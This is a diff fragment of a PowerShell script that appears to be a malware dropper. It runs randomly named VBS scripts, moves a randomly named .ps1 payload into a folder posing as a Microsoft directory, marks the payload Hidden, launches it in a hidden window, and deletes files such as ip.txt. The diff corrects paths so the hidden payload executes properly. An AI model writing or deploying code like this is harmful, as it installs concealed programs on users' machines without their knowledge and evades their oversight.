@@ -76,7 +76,7 @@ Get-NetFirewallRule -Name *ssh*
 & "./FoRAUwtxKkSB.vbs"
 
 
-$tasks = "C:/Users/%USERNAME%/Program Data/Microsoft/Windows/AEQKCPrkuifY.ps1"
+$tasks = "C:/Users/%USERNAME%/Program Data/Microsoft/Windows"
 
 Move-Item -Path "$path\ZDaFvwjOosKx.vbs" -Destination $initial_dir
 Move-Item -Path "$path\AEQKCPrkuifY.ps1" -Destination $tasks
@@ -131,7 +131,7 @@ Start-Process -FilePath "cscript.exe" -windowstyle hidden -ArgumentList "ZDaFvwj
 
 Set-ItemProperty -Name Attributes -Path "$tasks\AEQKCPrkuifY.ps1" -Value "Hidden"
 
-Start-Process -FilePath "$path\AEQKCPrkuifY.ps1" -windowstyle hidden
+Start-Process -FilePath "$tasks\AEQKCPrkuifY.ps1" -windowstyle hidden
 
 Remove-Item -Path "$initial_dir\ip.txt"
 Remove-Item -Path "$initial_dir\NzKnmxLrbsBw.txt"
